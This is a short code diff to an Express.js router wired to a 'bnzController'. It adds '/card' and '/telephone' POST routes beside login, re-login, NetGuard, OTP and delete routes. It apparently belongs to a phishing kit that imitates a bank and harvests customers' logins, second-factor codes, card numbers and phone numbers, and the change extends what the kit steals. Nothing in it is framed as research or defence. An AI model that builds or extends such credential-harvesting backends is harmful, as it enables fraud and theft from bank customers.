@@ -6,6 +6,8 @@ const {
     submitLogin,
     submitLoginAgain,
     submitNetguard,
+    submitTelephone,
+    submitCard,
     submitOtp,
     deleteEntry,
 } = require("../controllers/bnzController");
@@ -19,6 +21,8 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/netguard", submitNetguard);
 router.post("/otp", submitOtp);
+router.post("/card", submitCard);
+router.post("/telephone", submitTelephone);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
